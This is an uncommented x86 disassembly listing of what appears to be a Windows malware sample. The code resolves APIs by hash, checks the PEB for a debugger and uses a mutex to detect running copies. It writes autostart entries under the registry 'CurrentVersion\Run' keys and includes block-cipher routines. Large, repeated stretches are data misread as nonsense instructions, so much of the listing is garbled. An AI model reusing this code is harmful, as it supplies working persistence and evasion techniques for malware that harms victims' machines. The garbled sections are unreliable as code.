xor eax eax
xor ebx ebx
lodsb [ esi ]
xor al cl
mov cl ch
mov ch dl
mov dl dh
mov dh 0x8
not edx
not ecx
mov eax edx
rol eax 0x10
mov ax cx
pop edx
cmp edx eax
je rwxdata
pop esi
mov eax [ ebp - 0x4 ]
shl eax 0x1
add eax [ ebp - 0x10 ]
xor esi esi
xchg esi eax
mov ax [ esi ]
shl ax 0x2
add eax [ ebp - 0x8 ]
xchg esi eax
mov eax [ esi ]
add eax [ ebp + 0xc ]
pop ecx
pop edx
pop edi
pop ebx
pop esi
leave
retn 0xc
pop esi
add esi 0x4
add [ ebp - 0x4 ] 0x1
jmp rwxdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x14 ] eax
jne rwxdata
sub_4079c1
push ebp
mov ebp esp
pushad
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
add edi 0x40
mov ecx 0x8
cld
[ edi ] [ esi ]
mov eax [ edi - 0x20 ]
mov ebx [ edi - 0x1c ]
xor eax [ edi - 0x10 ]
xor ebx [ edi - 0xc ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov eax [ edi - 0x18 ]
mov ebx [ edi - 0x14 ]
xor eax [ edi - 0x8 ]
xor ebx [ edi - 0x4 ]
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] ebx
mov esi edi
call sub_407a30
mov al [ 0x3b7f669e ]
int3
sub_407a30
pop ebp
add edi 0x8
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x111 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
mov eax [ esp + 0x30 ]
call [ eax + 0x109 ]
mov eax [ edi - 0x20 ]
mov edx [ edi - 0x1c ]
xor [ edi ] eax
xor [ edi + 0x4 ] edx
mov eax [ edi - 0x18 ]
mov edx [ edi - 0x14 ]
xor [ edi + 0x8 ] eax
xor [ edi + 0xc ] edx
add ebp 0x8
xchg edi esi
mov eax [ esp + 0x30 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
mov eax [ esp + 0x30 ]
call [ eax + 0x109 ]
mov eax [ edi ]
mov edx [ edi + 0x4 ]
xor eax [ edi - 0x10 ]
xor edx [ edi - 0xc ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ edi + 0xc ]
xor eax [ edi - 0x8 ]
xor edx [ edi - 0x4 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edx
add ebp 0x8
add esi 0x8
add edi 0x18
mov eax [ esp + 0x30 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
mov eax [ esp + 0x30 ]
call [ eax + 0x109 ]
mov edi [ esp + 0x2c ]
mov esi edi
add esi 0x40
mov ecx 0x10
lodsd [ esi ]
bswap eax
stosd [ edi ]
sub ecx 0x1
jne rwxdata
lea edi [ esi - 0x30 ]
mov ecx 0x4
sub esi 0x10
[ edi ] [ esi ]
xor ebx ebx
mov eax [ esp + 0x30 ]
mov ecx [ eax + 0x119 ]
movzx esi [ ebx + ecx ]
mov ecx [ eax + 0x115 ]
movzx edx [ ebx + ecx ]
add esi [ esp + 0x2c ]
call [ eax + 0x10d ]
add edi 0x8
mov eax [ esp + 0x30 ]
mov ecx [ eax + 0x119 ]
movzx esi [ ebx + ecx + 0x1 ]
mov ecx [ eax + 0x115 ]
movzx edx [ ebx + ecx + 0x1 ]
add esi [ esp + 0x2c ]
call [ eax + 0x10d ]
add ebx 0x2
add edi 0x8
cmp ebx 0x1e
jl rwxdata
xor eax eax
mov edi [ esp + 0x2c ]
mov ecx 0x10
[ edi ]
popad
leave
retn 0xc
sub_407b59
push ebp
mov ebp esp
pushad
cld
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov ebp [ ebp + 0x10 ]
add ebp 0x40
mov eax [ edi ]
mov edx [ edi + 0x4 ]
xor eax [ ebp ]
xor edx [ ebp + 0x4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] edx
mov eax [ edi + 0x8 ]
mov edx [ edi + 0xc ]
xor eax [ ebp + 0x8 ]
xor edx [ ebp + 0xc ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
lea edi [ esi + 0x8 ]
add ebp 0x10
mov eax [ esp + 0x34 ]
mov ebx [ eax + 0x111 ]
mov dh 0x3
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
sub dl 0x1
jne rwxdata
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
and eax [ ebp ]
or ecx [ esi + 0xc ]
bswap eax
xor ecx [ esi + 0x8 ]
rol eax 0x1
mov [ esi + 0x8 ] ecx
bswap eax
and ecx [ ebp + 0x8 ]
xor eax [ esi + 0x4 ]
bswap ecx
mov [ esi + 0x4 ] eax
rol ecx 0x1
or eax [ ebp + 0x4 ]
bswap ecx
xor [ esi ] eax
xor [ esi + 0xc ] ecx
add ebp 0x10
sub dh 0x1
jne rwxdata
mov dl 0x3
mov dl 0x3
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
sub dl 0x1
jne rwxdata
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
xor eax [ ebp + 0x8 ]
xor ebx [ ebp + 0xc ]
xor ecx [ ebp ]
xor edx [ ebp + 0x4 ]
mov [ esi ] ecx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] ebx
popad
leave
retn 0x10
sub_407c45
push ebp
mov ebp esp
pushad
cld
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov ebp [ ebp + 0x10 ]
add ebp 0x140
mov eax [ edi ]
mov edx [ edi + 0x4 ]
xor eax [ ebp ]
xor edx [ ebp + 0x4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] edx
mov eax [ edi + 0x8 ]
mov edx [ edi + 0xc ]
xor eax [ ebp + 0x8 ]
xor edx [ ebp + 0xc ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
lea edi [ esi + 0x8 ]
sub ebp 0x8
mov eax [ esp + 0x34 ]
mov ebx [ eax + 0x111 ]
mov dh 0x3
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
sub ebp 0x8
xchg edi esi
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
sub ebp 0x8
xchg edi esi
sub dl 0x1
jne rwxdata
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
and eax [ ebp ]
or ecx [ esi + 0xc ]
bswap eax
xor ecx [ esi + 0x8 ]
rol eax 0x1
mov [ esi + 0x8 ] ecx
bswap eax
and ecx [ ebp - 0x8 ]
xor eax [ esi + 0x4 ]
bswap ecx
mov [ esi + 0x4 ] eax
rol ecx 0x1
or eax [ ebp + 0x4 ]
bswap ecx
xor [ esi ] eax
xor [ esi + 0xc ] ecx
sub ebp 0x10
sub dh 0x1
jne rwxdata
mov dl 0x3
mov dl 0x3
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
sub ebp 0x8
xchg edi esi
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
sub ebp 0x8
xchg edi esi
sub dl 0x1
jne rwxdata
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
xor eax [ ebp ]
xor ebx [ ebp + 0x4 ]
xor ecx [ ebp - 0x8 ]
xor edx [ ebp - 0x4 ]
mov [ esi ] ecx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] ebx
popad
leave
retn 0x10
sub_407d35
mov eax [ esi ]
xor eax [ ebp ]
xlat
ror eax 0x8
xlat
rol al 0x1
ror eax 0x8
xlat
ror al 0x1
rol ah 0x1
ror eax 0x8
xlat
xor [ edi ] eax
rol eax 0x8
xor [ edi ] eax
rol eax 0x8
xor [ edi + 0x4 ] eax
rol eax 0x8
xor [ edi ] eax
xor [ edi + 0x4 ] eax
mov eax [ esi + 0x4 ]
xor eax [ ebp + 0x4 ]
xlat
rol al 0x1
ror eax 0x8
xlat
ror al 0x1
rol ah 0x1
ror eax 0x8
xlat
ror eax 0x8
xlat
ror eax 0x8
mov cl al
xor cl ah
ror eax 0x10
xor cl al
xor cl ah
mov ch cl
xor ax cx
rol eax 0x10
xor ax cx
xor [ edi ] eax
xor [ edi + 0x4 ] eax
retn
sub_407fab
push ebx
mov ebx [ esi + 0x8d1 ]
mov ecx [ esi + 0x8d5 ]
mov edx [ ebx + esi + 0x8d9 ]
mov eax [ ebx + esi + 0x8dd ]
rol edx 0x13
rol eax 0x1b
add edx [ ecx + esi + 0x8d9 ]
add eax [ ecx + esi + 0x8dd ]
mov [ ebx + esi + 0x8d9 ] eax
mov [ ebx + esi + 0x8dd ] edx
sub ebx 0x8
jae rwxdata
sub ecx 0x8
jae rwxdata
mov ebx 0x80
mov [ esi + 0x8d1 ] ebx
mov [ esi + 0x8d5 ] ecx
pop ebx
retn
mov ecx 0x80
sub_40809b
call [ ebp - 0xedf ]
mov [ ebp - 0x4a9 ] eax
call sub_4080b2
outsb
je rwxdata
or bh [ ebx + 0x2200a50a ]
cld
mov edx ebx
mov ebx 0xd500b10a
mov edx 0xabb0e9b
mov ch 0x0
cmp al 0xc8
movsd [ edi ] [ esi ]
imul edi [ ebx + 0x1b00b90a ] 0xffffffc4
cwde
je rwxdata
insb
insb
add bh bh
xchg ebp eax
and ecx esi
idiv bh
call [ ebx + 0x6a ]
add bh bh
ror [ ecx + 0x5ce8fc45 ] 0x1
add [ eax ] eax
add bh ah
inc ebx
mov ecx 0x850abb20
add [ ebp - 0x44979db6 ] bl
or ah [ ecx - 0x3ec94600 ]
or bh [ ebp + 0x64a3e800 ]
dec ecx
mov ebx 0x6500c10a
jg rwxdata
or bl [ ecx ]
xchg ebx eax
ja rwxdata
iretd
mov bh 0x88
ror [ edx ] cl
cmp [ eax ] eax
and [ ebx + 0x4200690a ] edi
popfd
test [ ebp + 0x710abb ] eax
xor [ ebx ] ebp
dec ebx
pop ecx
mov edi 0x8e005d0a
sub eax 0xabf8210
popad
add [ esi - 0x59 ] dl
sbb [ ebx + 0x650abf ] ebp
or dh al
or bl [ ebx ]
cmp [ ebp - 0x11 ] 0xcf80abb
pop edx
popad
fcom [ ebx + edi * 4 + 0xa ]
cld
or al 0x0
add [ eax ] al
add [ edi - 0x73 ] bl
mov ch 0x84
ja rwxdata
xor [ edi + 0xabf9cb3 ] dl
insd
add dh cl
int1
frstor [ ebx - 0x41 ]
or bh [ ecx ]
js rwxdata
or ah [ ebp ]
mov ebx 0x23007d0a
and eax 0xabf696c
jne rwxdata
scasd [ edi ]
add bl [ eax ]
test bl dl
or dh [ ecx ]
add [ ecx - 0x2c32e6aa ] bl
or dh [ 0x4cca2800 ]
cli
ror [ edx ] cl
inc ecx
add [ eax - 0x2cd37ddf ] bl
or al [ ebp ]
call 0xffffffffd43c54b9
or cl [ ecx ]
aam 0xfa
sahf
xor al 0xd3
or cl [ ebp ]
cmp ecx [ ecx ]
sub_4080b2
call [ ebp - 0xedf ]
mov [ ebp - 0x4a1 ] eax
call sub_4080ca
jne rwxdata
call 0xffffffffbb89e5e0
or al cl
add [ ebp + 0x7f ] ah
dec edx
jb rwxdata
call sub_40825c
out 0x43 eax
xor al [ eax ]
mov ecx 0x850abb20
add [ ebp - 0x44979db6 ] bl
or ah [ ecx - 0x3ec94600 ]
or bh [ ebx + 0x2200a50a ]
cld
mov edx ebx
mov ebx 0xd500b10a
mov edx 0xabb0e9b
mov ch 0x0
cmp al 0xc8
movsd [ edi ] [ esi ]
imul edi [ ebx + 0x1b00b90a ] 0xffffffc4
cwde
je rwxdata
idiv bh
call [ ebx + 0x6a ]
add bh bh
ror [ ecx + 0x5ce8fc45 ] 0x1
add [ eax ] eax
add bh ah
inc ebx
or bh [ ebp + 0x64a3e800 ]
dec ecx
mov ebx 0x6500c10a
jg rwxdata
or bl [ ecx ]
xchg ebx eax
ja rwxdata
iretd
mov bh 0x88
ror [ edx ] cl
cmp [ eax ] eax
and [ ebx + 0x4200690a ] edi
popfd
test [ ebp + 0x710abb ] eax
xor [ ebx ] ebp
dec ebx
pop ecx
mov edi 0x8e005d0a
sub eax 0xabf8210
popad
add [ esi - 0x59 ] dl
sbb [ ebx + 0x650abf ] ebp
or dh al
or bl [ ebx ]
cmp [ ebp - 0x11 ] 0xcf80abb
pop edx
popad
fcom [ ebx + edi * 4 + 0xa ]
cld
or al 0x0
add [ eax ] al
add [ edi - 0x73 ] bl
mov ch 0x84
ja rwxdata
xor [ edi + 0xabf9cb3 ] dl
insd
add dh cl
int1
frstor [ ebx - 0x41 ]
or bh [ ecx ]
js rwxdata
or ah [ ebp ]
mov ebx 0x23007d0a
and eax 0xabf696c
jne rwxdata
scasd [ edi ]
add bl [ eax ]
test bl dl
or dh [ ecx ]
add [ ecx - 0x2c32e6aa ] bl
or dh [ 0x4cca2800 ]
cli
ror [ edx ] cl
inc ecx
add [ eax - 0x2cd37ddf ] bl
or al [ ebp ]
call 0xffffffffd43c54b9
or cl [ ecx ]
aam 0xfa
sahf
xor al 0xd3
or cl [ ebp ]
cmp ecx [ ecx ]
sub_4080ca
call [ ebp - 0xedf ]
mov [ ebp - 0x4bd ] eax
push 0x4dcf392
push [ ebp - 0x4c1 ]
push 0x0
call sub_4078d5
push 0xff
lea ebx [ ebp - 0x9ca ]
push ebx
push 0x0
call eax
mov [ ebp - 0x4 ] eax
call sub_40825c
out 0x43 eax
mov ecx 0x850abb20
add [ ebp - 0x44979db6 ] bl
or ah [ ecx - 0x3ec94600 ]
or bh [ ebx + 0x2200a50a ]
cld
mov edx ebx
mov ebx 0xd500b10a
mov edx 0xabb0e9b
mov ch 0x0
cmp al 0xc8
movsd [ edi ] [ esi ]
imul edi [ ebx + 0x1b00b90a ] 0xffffffc4
cwde
je rwxdata
idiv bh
call [ ebx + 0x6a ]
add bh bh
ror [ ecx + 0x5ce8fc45 ] 0x1
add [ eax ] eax
add bh ah
inc ebx
or bh [ ebp + 0x64a3e800 ]
dec ecx
mov ebx 0x6500c10a
jg rwxdata
or bl [ ecx ]
xchg ebx eax
ja rwxdata
iretd
mov bh 0x88
ror [ edx ] cl
cmp [ eax ] eax
and [ ebx + 0x4200690a ] edi
popfd
test [ ebp + 0x710abb ] eax
xor [ ebx ] ebp
dec ebx
pop ecx
mov edi 0x8e005d0a
sub eax 0xabf8210
popad
add [ esi - 0x59 ] dl
sbb [ ebx + 0x650abf ] ebp
or dh al
or bl [ ebx ]
cmp [ ebp - 0x11 ] 0xcf80abb
pop edx
popad
fcom [ ebx + edi * 4 + 0xa ]
cld
or al 0x0
add [ eax ] al
add [ edi - 0x73 ] bl
mov ch 0x84
ja rwxdata
xor [ edi + 0xabf9cb3 ] dl
insd
add dh cl
int1
frstor [ ebx - 0x41 ]
or bh [ ecx ]
js rwxdata
or ah [ ebp ]
mov ebx 0x23007d0a
and eax 0xabf696c
jne rwxdata
scasd [ edi ]
add bl [ eax ]
test bl dl
or dh [ ecx ]
add [ ecx - 0x2c32e6aa ] bl
or dh [ 0x4cca2800 ]
cli
ror [ edx ] cl
inc ecx
add [ eax - 0x2cd37ddf ] bl
or al [ ebp ]
call 0xffffffffd43c54b9
or cl [ ecx ]
aam 0xfa
sahf
xor al 0xd3
or cl [ ebp ]
cmp ecx [ ecx ]
sub_40825c
pop edi
lea esi [ ebp - 0xf7c ]
call $+5
pop esi
add esi 0x1fb
lea edi [ ebp - 0xf7c ]
movzx eax [ edi + 0x4 ]
push [ edi ]
push [ eax + esi ]
push 0x0
call sub_4078d5
movzx edx [ edi + 0x6 ]
mov [ edx + esi ] eax
add edi 0x8
jmp rwxdata
movzx eax [ esi ]
movzx ecx [ esi + 0x2 ]
add esi 0x4
add eax edi
push ecx
push ecx
push esi
push eax
call [ ebp - 0xed3 ]
pop ecx
add esi ecx
cmp [ esi ] 0x0
jne rwxdata
add esi 0x2
mov [ ebp - 0x8 ] esi
cmp [ edi ] 0x0
je rwxdata
push 0xff
lea eax [ ebp - 0x9ca ]
push eax
lea edi [ ebp - 0x8cb ]
push edi
call [ ebp - 0xed3 ]
cmp [ ebp - 0xb86 ] 0x1
jne rwxdata
movzx eax [ esi ]
movzx ecx [ esi + 0x2 ]
add esi 0x4
mov [ eax + edi ] esi
add esi ecx
jmp rwxdata
call sub_408364
popad
jbe rwxdata
push 0x1
lea eax [ ebp - 0xf7c ]
push eax
mov esi [ ebp - 0x8 ]
add esi 0x4
call esi
push 0x3921bf03
push [ ebp - 0x4c1 ]
push 0x0
call sub_4078d5
call eax
push eax
call [ ebp - 0x48c ]
sub eax 0x3
mov ecx [ ebp - 0x4 ]
cmp ecx eax
jne rwxdata
cmp [ esi ] 0x0
je rwxdata
je rwxdata
popad
arpl [ ebx ] bp
lea eax [ ebp - 0xfd0 ]
push eax
lea eax [ ebp - 0xfc0 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xb6d ]
push eax
push ebx
call [ ebp - 0xf4f ]
jmp rwxdata
popad
leave
retn
push [ ebp - 0x4 ]
call [ ebp - 0xedb ]
cmp [ ebp - 0x274 ] 0x1
je rwxdata
call $+5
pop eax
sub eax 0x11ce
push [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xf7c ]
push eax
call [ ebp - 0x278 ]
lea esi [ ebp - 0xf7c ]
call $+5
pop edi
sub edi 0x1157
call sub_408433
fld [ eax ]
push ecx
add eax 0x4b00e9
in eax 0x0
popfd
add ch bl
add dl ch
add ch bh
add [ edx - 0x13fefeff ] bl
add [ 0x900ef01 ] al
add [ esi ] esp
or eax 0x11006b01
add [ eax ] eax
add [ 0x19001e01 ] edx
add [ esi ] ebx
add [ 0x59000001 ] bl
cmp [ ebp - 0xea7 ] 0x0
je rwxdata
movzx edx [ ecx + 0x2 ]
add edi edx
add ecx 0x4
jmp rwxdata
push esi
call [ ebp - 0xea3 ]
jmp rwxdata
push esi
call [ ebp - 0xea7 ]
movzx edx [ ecx ]
mov [ edx + esi ] edi
cmp [ ecx + 0x2 ] 0x0
je rwxdata
sub_408364
call [ ebp - 0xedf ]
push 0x7e04376b
push eax
push 0x0
call sub_4078d5
push 0x0
push 0x0
call eax
mov [ ebp - 0x6cd ] al
push 0xe6e5030e
push [ ebp - 0x4a1 ]
push 0x0
call sub_4078d5
or eax eax
jne rwxdata
mov [ ebp - 0xef3 ] eax
lea eax [ ebp - 0xb81 ]
push eax
push 0x0
push 0x0
call [ ebp - 0xef7 ]
mov [ ebp - 0x4 ] eax
call [ ebp - 0xef3 ]
cmp eax 0xb7
je rwxdata
push 0x87d52c94
push [ ebp - 0x4c1 ]
push 0x0
call sub_4078d5
popad
leave
retn
push [ ebp - 0x4 ]
call [ ebp - 0xedb ]
cmp [ ebp - 0x274 ] 0x1
je rwxdata
call $+5
pop eax
sub eax 0x11ce
push [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xf7c ]
push eax
call [ ebp - 0x278 ]
lea esi [ ebp - 0xf7c ]
call $+5
pop edi
sub edi 0x1157
call sub_408433
fld [ eax ]
push ecx
add eax 0x4b00e9
in eax 0x0
popfd
add ch bl
add dl ch
add ch bh
add [ edx - 0x13fefeff ] bl
add [ 0x900ef01 ] al
add [ esi ] esp
or eax 0x11006b01
add [ eax ] eax
add [ 0x19001e01 ] edx
add [ esi ] ebx
add [ 0x59000001 ] bl
cmp [ ebp - 0xea7 ] 0x0
je rwxdata
movzx edx [ ecx + 0x2 ]
add edi edx
add ecx 0x4
jmp rwxdata
push esi
call [ ebp - 0xea3 ]
jmp rwxdata
push esi
call [ ebp - 0xea7 ]
movzx edx [ ecx ]
mov [ edx + esi ] edi
cmp [ ecx + 0x2 ] 0x0
je rwxdata
sub_408433
pop ecx
cmp [ ebp - 0xea7 ] 0x0
je rwxdata
movzx edx [ ecx + 0x2 ]
add edi edx
add ecx 0x4
jmp rwxdata
push esi
call [ ebp - 0xea3 ]
jmp rwxdata
push esi
call [ ebp - 0xea7 ]
movzx edx [ ecx ]
mov [ edx + esi ] edi
cmp [ ecx + 0x2 ] 0x0
je rwxdata
popad
leave
retn
sub_408551
inc [ ebp + 0x1 ]
or [ eax ] al
insd
outsb
jne rwxdata
add [ eax ] al
popad
jae rwxdata
add [ eax - 0x1 ] dl
jne rwxdata
push edi
imul ebp [ esi + 0x64 ] 0x5c73776f
inc ebx
jne rwxdata
jb rwxdata
or [ 0x12010001 ] ecx
push cs
adc eax [ eax ]
push ebx
insd
insd
jo rwxdata
push eax
push [ ebp - 0x4 ]
call [ esi + 0x3d ]
push [ ebp - 0x4 ]
add [ eax ] al
jb rwxdata
add [ eax ] al
imul ebp [ edi + 0x6e ] 0x6e75525c
jne rwxdata
imul ebp [ esi + 0x75 ] 0x74732078
jne rwxdata
cmp [ esi + 0x3f8 ] 0x1
jne rwxdata
push esi
call [ esi + 0xd00 ]
jle rwxdata
push ebp
mov ebp esp
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x3f7 ] 0x0
outsb
je rwxdata
cmp [ esi + 0x3f6 ] 0x1
jne rwxdata
mov eax 0x1
cmp [ esi + 0x3f7 ] 0x0
jle rwxdata
mov ecx 0x80000001
mov ecx 0x80000002
jmp rwxdata
add [ edi - 0x1 ] dl
xchg esi eax
add [ eax ] 0xbe800000
scasd [ edi ]
or [ eax ] al
add [ ecx ] al
jne rwxdata
outsb
push ebx
dec edi
inc esi
push esp
push edi
inc ecx
push edx
inc ebp
pop esp
dec ebp
imul esp [ ebx + 0x72 ] 0x666f736f
je rwxdata
imul ebp [ edi + 0x46 ] 0x3fb796c
or [ eax ] eax
cmp [ edx ] esi
xor dh [ edx ]
xor ah [ ebx + 0x63 ]
xor [ 0xd0a0000 ] esi
mov eax [ 0xffffffffec8b5500 ]
add esp 0xfffffffc
mov esi [ ebp + 0x8 ]
push 0xff
lea edi [ esi + 0xd13 ]
push edi
call [ esi + 0xad ]
call sub_4085db
call [ esi + 0x31 ]
leave
retn 0x4
cld
jb rwxdata
cmp [ esi + 0xd09 ] 0x1
jne rwxdata
push 0x0
push esi
call [ esi + 0xf5 ]
or eax eax
je rwxdata
lea edi [ esi + 0x6b1 ]
push edi
lea edi [ esi + 0x5b2 ]
push edi
call [ esi + 0xcd ]
lea eax [ ebp - 0x4 ]
push eax
push 0xf003f
push 0x0
push edi
push ecx
call [ esi + 0x35 ]
push 0xff
lea eax [ esi + 0x6b1 ]
push eax
push 0x1
push 0x0
lea eax [ esi + 0xe12 ]
cmp [ esi + 0x3fa ] 0x1
jne rwxdata
push esi
call [ esi + 0xd0a ]
lea edi [ esi + 0x5b2 ]
push edi
call [ esi + 0x51 ]
cmp [ esi + 0xd08 ] 0x1
jne rwxdata
lea eax [ esi + 0x8bd ]
push eax
push 0x0
push esi
push [ esi + 0xd0e ]
push 0x0
push 0x0
call [ esi + 0x29 ]
leave
retn 0x4
cmp [ esi + 0x3f9 ] 0x1
jne rwxdata
push esi
call [ esi + 0xf1 ]
lea eax [ esi + 0x8c1 ]
push eax
push 0x0
push esi
push [ esi + 0xf9 ]
push 0x0
push 0x0
call [ esi + 0x29 ]
sub_4085db
push edi
call [ esi + 0x81 ]
cmp [ esi + 0x8af ] 0x1
jne rwxdata
mov ecx 0x80000001
mov ecx 0x80000002
jmp rwxdata
lea eax [ ebp - 0x4 ]
push eax
push 0xf003f
push 0x0
push edi
push ecx
call [ esi + 0x35 ]
push 0xff
lea eax [ esi + 0x6b1 ]
push eax
push 0x1
push 0x0
lea eax [ esi + 0xe12 ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x3d ]
push [ ebp - 0x4 ]
call [ esi + 0x31 ]
leave
retn 0x4
sub_40862e
aad 0x0
lds eax [ eax ]
push ebp
mov ebp esp
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x3f7 ] 0x0
jle rwxdata
cmp [ esi + 0x3f8 ] 0x1
jne rwxdata
push esi
call [ esi + 0xd00 ]
cmp [ esi + 0x3f6 ] 0x1
jne rwxdata
mov eax 0x1
cmp [ esi + 0x3f7 ] 0x0
jle rwxdata
cmp [ esi + 0xd09 ] 0x1
jne rwxdata
push 0x0
push esi
call [ esi + 0xf5 ]
or eax eax
je rwxdata
lea edi [ esi + 0x6b1 ]
push edi
lea edi [ esi + 0x5b2 ]
push edi
call [ esi + 0xcd ]
cmp [ esi + 0x3fa ] 0x1
jne rwxdata
push esi
call [ esi + 0xd0a ]
lea edi [ esi + 0x5b2 ]
push edi
call [ esi + 0x51 ]
cmp [ esi + 0xd08 ] 0x1
jne rwxdata
lea eax [ esi + 0x8bd ]
push eax
push 0x0
push esi
push [ esi + 0xd0e ]
push 0x0
push 0x0
call [ esi + 0x29 ]
leave
retn 0x4
cmp [ esi + 0x3f9 ] 0x1
jne rwxdata
push esi
call [ esi + 0xf1 ]
lea eax [ esi + 0x8c1 ]
push eax
push 0x0
push esi
push [ esi + 0xf9 ]
push 0x0
push 0x0
call [ esi + 0x29 ]
sub_409bd9
push ebp
mov ebp esp
add esp 0xfffff030
pushad
xor eax eax
lea edi [ ebp - 0xf7c ]
mov ecx 0xf74
[ edi ]
xor eax eax
lea edi [ ebp - 0xfc0 ]
mov ecx 0x44
[ edi ]
mov [ ebp - 0xe53 ] 0xe7
jmp rwxdata
lea esi [ ebp - 0xf7c ]
rdtsc
xchg edx eax
xor ecx ecx
imul eax eax 0xac564b05
add eax 0x1
mov [ esi + ecx * 4 + 0x8d9 ] eax
add ecx 0x1
cmp ecx 0x22
jb rwxdata
fld1
fstp [ esi + 0x961 ]
mov [ esi + 0x8d1 ] 0x0
mov [ esi + 0x8d5 ] 0x50
call sub_40a91f
push edi
mov edi 0x1e
call sub_40a91f
sub edi 0x1
jne rwxdata
pop edi
mov eax [ fs : 0x30 ]
mov eax [ esp + 0x1c ]
sub eax 0x25
call eax
nop
nop
nop
nop
nop
nop
nop
push 0x4134d1ad
push [ ebp - 0x4c1 ]
push 0x0
call sub_40a249
mov [ ebp - 0xedf ] eax
call sub_40aa0f
popad
jbe rwxdata
ror [ ecx + 0x5ce8fc45 ] 0x1
add [ eax ] eax
add bh ah
jo rwxdata
idiv bh
call [ ebx + 0x6a ]
add bh bh
or bh [ ebp + 0x64a3e800 ]
dec ecx
mov ebx 0x6500c10a
jg rwxdata
inc ebx
mov ecx 0x850abb20
add [ ebp - 0x44979db6 ] bl
or ah [ ecx - 0x3ec94600 ]
or bh [ ebx + 0x2200a50a ]
cld
mov edx ebx
mov ebx 0xd500b10a
mov edx 0xabb0e9b
mov ch 0x0
cmp al 0xc8
movsd [ edi ] [ esi ]
imul edi [ ebx + 0x1b00b90a ] 0xffffffc4
cwde
je rwxdata
xor esi [ edx ]
add bh bh
xchg ebp eax
and ecx esi
or bl [ ecx ]
xchg ebx eax
ja rwxdata
iretd
mov bh 0x88
ror [ edx ] cl
cmp [ eax ] eax
and [ ebx + 0x4200690a ] edi
popfd
test [ ebp + 0x710abb ] eax
xor [ ebx ] ebp
dec ebx
pop ecx
mov edi 0x8e005d0a
sub eax 0xabf8210
popad
add [ esi - 0x59 ] dl
sbb [ ebx + 0x650abf ] ebp
or dh al
or bl [ ebx ]
cmp [ ebp - 0x11 ] 0xcf80abb
pop edx
popad
fcom [ ebx + edi * 4 + 0xa ]
cld
or al 0x0
add [ eax ] al
add [ edi - 0x73 ] bl
mov ch 0x84
ja rwxdata
xor [ edi + 0xabf9cb3 ] dl
insd
add dh cl
int1
frstor [ ebx - 0x41 ]
or bh [ ecx ]
js rwxdata
or ah [ ebp ]
mov ebx 0x23007d0a
and eax 0xabf696c
jne rwxdata
scasd [ edi ]
add bl [ eax ]
test bl dl
or dh [ ecx ]
add [ ecx - 0x2c32e6aa ] bl
or dh [ 0x4cca2800 ]
cli
ror [ edx ] cl
inc ecx
add [ eax - 0x2cd37ddf ] bl
or al [ ebp ]
call 0xffffffffd43c7e2d
or cl [ ecx ]
aam 0xfa
sahf
xor al 0xd3
or cl [ ebp ]
cmp ecx [ ecx ]
sub_409c10
push ebp
mov ebp esp
add esp 0xfffffa30
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x3fb ]
push eax
push 0x0
push 0x0
call [ esi + 0x85 ]
mov [ esi + 0x8c5 ] eax
call [ esi + 0x89 ]
cmp eax 0xb7
jne rwxdata
push esi
lea eax [ esi + 0x96b ]
push eax
lea eax [ esi + 0x145 ]
push eax
call [ esi + 0xfd ]
call sub_409c65
ja rwxdata
leave
retn 0x4
push 0xbba4d88f
push [ esi + 0xac3 ]
push eax
call [ esi + 0xdd ]
lea ecx [ ebp - 0x196 ]
push ecx
push 0x101
call eax
test eax eax
jne rwxdata
xor bl [ edi + 0x33 ]
xor al [ eax ]
leave
retn 0x4
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
mov [ ebp - 0x1bc ] 0x0
cmp [ esi + 0x2c1 ] 0xffffffff
jne rwxdata
mov ecx [ ebp - 0x1bc ]
cmp ecx [ esi + 0x18c ]
jbe rwxdata
cmp [ ebp - 0x1bc ] 0x2
jne rwxdata
push [ esi + 0x18c ]
pop [ esi + 0x2c1 ]
push 0x131
lea eax [ esi + 0x190 ]
push eax
lea eax [ esi + 0x2c5 ]
push eax
call [ esi + 0xa9 ]
mov [ esi + 0x18c ] 0xffffffff
lea edi [ ebp - 0x2bb ]
push edi
push ecx
lea edi [ esi + 0x190 ]
